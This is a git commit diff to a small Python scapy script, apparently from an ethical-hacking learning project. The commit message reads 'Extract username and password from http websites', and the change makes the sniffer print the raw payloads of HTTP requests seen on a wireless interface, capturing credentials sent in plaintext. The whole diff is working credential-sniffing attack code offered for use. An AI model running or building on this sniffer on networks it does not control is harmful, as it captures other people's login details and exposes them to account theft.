9e277f902c257675210eda617898fc9804ab1b30
akshata-01 <akshata.0015@gmail.com>
2022-11-11 10:22:03 +0530

    Extract username and password from http websites

--- Packet_Sniffer/packet_sniffer.py
+++ Packet_Sniffer/packet_sniffer.py
@@ -1,11 +1,14 @@
 #!usr/bin/env python3 
 
 import scapy.all as scapy 
+from scapy.layers import http
 
 def sniff(interface):
     scapy.sniff(iface = interface, store = False, prn = processed_sniffed_packet) #prn = For each packet we capture it'll call another function for us
 
 def processed_sniffed_packet(packet):
-    print (packet)
+    if packet.haslayer(http.HTTPRequest): #Checks if packet has HTTP layer
+        if packet.haslayer(scapy.Raw): 
+            print(packet[scapy.Raw].load)
 
 sniff("wlan0")
